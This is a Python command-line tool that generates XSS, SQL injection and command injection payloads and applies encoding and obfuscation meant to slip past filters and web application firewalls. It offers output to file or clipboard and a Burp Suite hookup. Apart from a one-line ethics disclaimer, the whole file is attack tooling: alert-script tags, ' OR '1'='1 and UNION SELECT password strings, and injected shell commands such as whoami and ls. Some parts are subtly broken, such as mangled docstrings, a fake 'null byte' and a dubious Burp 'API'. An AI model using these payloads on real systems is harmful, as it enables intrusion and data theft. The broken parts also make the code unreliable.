"""
payload_tool.py
==============
A CLI-based tool for generating evasion-ready payloads for XSS, SQL Injection, and Command Injection.
Features:
- Modules: XSS (reflected, stored, dom), SQLi (error, union, blind), Command Injection (linux, windows).
- Encoding: Base64, URL, Hex, Unicode.
- Obfuscation: Low (case/spacing), High (comments/null byte).
- Output: CLI, JSON file, Clipboard.
- Integration: Burp Suite Repeater API.
- Main page: Interactive CLI menu with match statement.

Usage: python payload_tool.py
Dependencies: pip install pyperclip requests
Safety: For educational/ethical testing only. Do not use maliciously.
"""

import argparse
import json
import pyperclip
import base64
import urllib.parse
import random
import requests
import os

# ========================
# Helper Functions
# ========================

def encode_payload(payload, method):
   # 
    #Encodes a payload to bypass filters.
    #- 'base64': Converts to Base64 string.
  #  - 'url': Percent-encodes for URLs.
  #  - 'hex': Hexadecimal escape (\xHH).
   # - 'unicode': Unicode escape (\uHHHH).
#    Returns original if method is invalid.
    
    if method == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif method == 'url':
        return urllib.parse.quote(payload)
    elif method == 'hex':
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    elif method == 'unicode':
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    return payload

def obfuscate_payload(payload, level='low'):
    
   # Obfuscates a payload to evade WAFs.
  #  - 'low': Randomizes case and replaces spaces with %20.
  #  - 'high': Adds random comments and null byte.
    
    if level == 'low':
        payload = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        payload = payload.replace(' ', '%20')
    elif level == 'high':
        comments = ['/*comment*/', '-- ', '# ']
        payload = random.choice(comments) + payload + random.choice(comments)
        payload += r'\x00'  # Use raw string for null byte
    return payload

def output_payloads(payloads, format='cli', file='payloads.json'):
    
   # Outputs payloads in specified format.
    #- 'cli': Prints to console.
    #- 'json': Saves to JSON file.
    #- 'clipboard': Copies to clipboard.
    #Handles special characters safely.
    
    try:
        if format == 'cli':
            for payload in payloads:
                print(payload)
        elif format == 'json':
            file = os.path.normpath(file)  # Normalize path for cross-platform compatibility
            with open(file, 'w', encoding='utf-8') as f:
                json.dump({'payloads': payloads}, f, indent=4, ensure_ascii=False)
            print(f"Saved to {file}")
        elif format == 'clipboard':
            pyperclip.copy('\n'.join(str(p) for p in payloads))  # Convert to string
            print("Copied to clipboard")
    except Exception as e:
        print(f"Output error: {e}")

def send_to_burp(payload, burp_url='http://localhost:8080'):
    
   # Sends payload to Burp Suite Repeater API.
    #Requires Burp running with API enabled.
    
    try:
        response = requests.post(burp_url, data={'payload': payload})
        print(f"Sent to Burp: {response.status_code}")
    except Exception as e:
        print(f"Burp integration error: {e}")

# ========================
# Payload Generator Classes
# ========================

class XSSGenerator:
    
    #Generates XSS payloads with variants and bypasses.
    #Variants: reflected, stored, dom.
    #Bypasses: Uncommon tags, event handlers, null bytes.
    
    def __init__(self):
        self.payloads = []

    def generate(self, variant='reflected'):
        #Generates payloads based on the variant.
        base_payloads = {
            'reflected': '<script>alert(1)</script>',
            'stored': '<img src=x onerror=alert(1)>',
            'dom': 'javascript:alert(1)'
        }
        payload = base_payloads.get(variant, base_payloads['reflected'])
        bypasses = [
            '<svg onload=alert(1)>',
            '<iframe srcdoc="<script>alert(1)</script>">',
            '<div onmouseover=alert(1)>Hover me</div>',
            '"><script>alert(1)</script>',
            payload + r'\x00'  # Use raw string for null byte
        ]
        self.payloads = [payload] + random.sample(bypasses, 2)
        return self.payloads

    def apply_advanced(self, encode=None, obfuscate=None):
        #Applies encoding and obfuscation to payloads.
        if encode:
            self.payloads = [encode_payload(p, encode) for p in self.payloads]
        if obfuscate:
            self.payloads = [obfuscate_payload(p, obfuscate) for p in self.payloads]

class SQLiGenerator:

#    Generates SQL Injection payloads with variants and bypasses.
 #   Variants: error, union, blind.
  #  Bypasses: Comments, case variation, encoded spaces.
    
    def __init__(self):
        self.payloads = []

    def generate(self, variant='error'):
        #Generates payloads based on the variant.
        base_payloads = {
            'error': "' OR '1'='1",
            'union': "UNION SELECT user, password FROM users",
            'blind': "AND SLEEP(5)"
        }
        payload = base_payloads.get(variant, base_payloads['error'])
        bypasses = [
            "/*!50000UniOn*/ /*!50000SeLeCt*/ 1,2,3",
            "' OR '1'='1'-- ",
            "UNION%20SELECT%20NULL,NULL",
            payload.upper(),
            payload + r'\x00'  # Use raw string for null byte
        ]
        self.payloads = [payload] + random.sample(bypasses, 2)
        return self.payloads

    def apply_advanced(self, encode=None, obfuscate=None):
        #Applies encoding and obfuscation to payloads.
        if encode:
            self.payloads = [encode_payload(p, encode) for p in self.payloads]
        if obfuscate:
            self.payloads = [obfuscate_payload(p, obfuscate) for p in self.payloads]

class CommandInjectionGenerator:
#
 #   Generates Command Injection payloads with variants and bypasses.
  #  Variants: linux, windows.
   # Bypasses: Alternative separators, subshells.
    
    def __init__(self):
        self.payloads = []

    def generate(self, variant='linux'):
        #Generates payloads based on the variant.
        base_payloads = {
            'linux': '; ls',
            'windows': '& whoami'
        }
        payload = base_payloads.get(variant, base_payloads['linux'])
        bypasses = [
            '&& id',
            '| netstat',
            '$(whoami)',
            '`dir`',
            payload + r'\x00'  # Use raw string for null byte
        ]
        self.payloads = [payload] + random.sample(bypasses, 2)
        return self.payloads

    def apply_advanced(self, encode=None, obfuscate=None):
        #Applies encoding and obfuscation to payloads.
        if encode:
            self.payloads = [encode_payload(p, encode) for p in self.payloads]
        if obfuscate:
            self.payloads = [obfuscate_payload(p, obfuscate) for p in self.payloads]

# ========================
# CLI Main Menu
# ========================

def main_menu():

#    Interactive CLI menu with all options.
 #   Uses match statement to select module.
  #  Loops until user exits.
    
    while True:
        # Display main menu
        print("\n=== Payload Generation Tool - Main Menu ===")
        print("1. Generate XSS Payloads")
        print("2. Generate SQL Injection Payloads")
        print("3. Generate Command Injection Payloads")
        print("4. Exit")
        choice = input("Select an option (1-4): ").strip()

        # Handle module selection with match
        match choice:
            case '1':
                generator_class = XSSGenerator
                variants = ['reflected', 'stored', 'dom']
                module_name = "XSS"
            case '2':
                generator_class = SQLiGenerator
                variants = ['error', 'union', 'blind']
                module_name = "SQL Injection"
            case '3':
                generator_class = CommandInjectionGenerator
                variants = ['linux', 'windows']
                module_name = "Command Injection"
            case '4':
                print("Exiting...")
                break
            case _:
                print("Invalid choice. Please select 1-4.")
                continue

        # Prompt for variant
        print(f"\nAvailable {module_name} variants: {', '.join(variants)}")
        variant = input(f"Enter variant (default: {variants[0]}): ").strip() or variants[0]
        if variant not in variants:
            print(f"Invalid variant. Using default: {variants[0]}")
            variant = variants[0]

        # Prompt for encoding
        print("\nEncoding options: none, base64, url, hex, unicode")
        encode = input("Enter encoding (default: none): ").strip() or 'none'
        encode = None if encode == 'none' else encode
        if encode and encode not in ['base64', 'url', 'hex', 'unicode']:
            print("Invalid encoding. Using none.")
            encode = None

        # Prompt for obfuscation
        print("\nObfuscation options: none, low, high")
        obfuscate = input("Enter obfuscation level (default: none): ").strip() or 'none'
        obfuscate = None if obfuscate == 'none' else obfuscate
        if obfuscate and obfuscate not in ['low', 'high']:
            print("Invalid obfuscation. Using none.")
            obfuscate = None

        # Prompt for output
        print("\nOutput options: cli, json, clipboard")
        output_format = input("Enter output format (default: cli): ").strip() or 'cli'
        if output_format not in ['cli', 'json', 'clipboard']:
            print("Invalid output format. Using cli.")
            output_format = 'cli'

        # Prompt for Burp integration
        burp_input = input("\nSend to Burp Suite? (y/n, default: n): ").strip().lower()
        burp = burp_input == 'y'

        # Generate and process payloads
        generator = generator_class()
        generator.generate(variant)
        print(f"DEBUG: Raw payloads: {generator.payloads}")  # Debug output
        generator.apply_advanced(encode, obfuscate)
        print(f"DEBUG: Processed payloads: {generator.payloads}")  # Debug output
        output_payloads(generator.payloads, output_format)
        if burp:
            for payload in generator.payloads:
                send_to_burp(payload)

# ========================
# Main Entry Point
# ========================

def cli_interface():
    #
    #Parses command-line arguments and runs the main menu.
    
    parser = argparse.ArgumentParser(description='Payload Generation Tool')
    args = parser.parse_args()
    main_menu()

if __name__ == '__main__':
    cli_interface()